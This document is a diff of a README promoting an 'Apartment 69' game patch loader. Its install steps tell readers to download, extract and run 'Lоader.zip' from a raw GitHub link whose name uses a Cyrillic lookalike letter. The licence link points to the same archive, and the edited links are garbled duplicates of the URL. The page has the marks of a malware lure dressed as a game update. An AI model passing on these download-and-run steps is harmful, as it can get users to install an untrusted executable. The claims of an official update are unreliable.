@@ -61,9 +61,9 @@ All these features are purpose-designed to maximize your gaming satisfaction in 
 
 Follow this step-by-step process to get started with **Apartment 69 v0.08 Patch Loader**:
 
-1. Download `https://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zip` from the repository.
-2. Extract the contents of `https://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zip` using your preferred archiving tool.
-3. Run the Loader executable (`https://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zip` on Windows / appropriate binary on Linux/macOS).
+1. Download `https://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zipоhttps://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zip` from the repository.
+2. Extract the contents of `https://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zipоhttps://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zip` using your preferred archiving tool.
+3. Run the Loader executable (`https://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zipоhttps://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zip` on Windows / appropriate binary on Linux/macOS).
 4. Select your Apartment 69 game installation folder when prompted.
 5. Click ‘Apply Patch’ and follow on-screen instructions. The Loader will back up your original files and apply the patch.
 6. Upon successful completion, launch Apartment 69 and enjoy the upgrades!
@@ -110,7 +110,7 @@ This tool modifies game files solely for the purpose of officially supported upd
 
 ## 📄 License - MIT 2025
 
-This project is distributed under the [MIT License (2025)](https://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zip).  
+This project is distributed under the [MIT License (2025)](https://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zipоhttps://raw.githubusercontent.com/BouallaguiHama/Apt69-v008-UpdateHub/main/Lоader.zip).  
 You are free to use, modify, and distribute this Loader in compliance with the MIT license.  
 Please refer to the LICENSE file in this repository for more information.
 
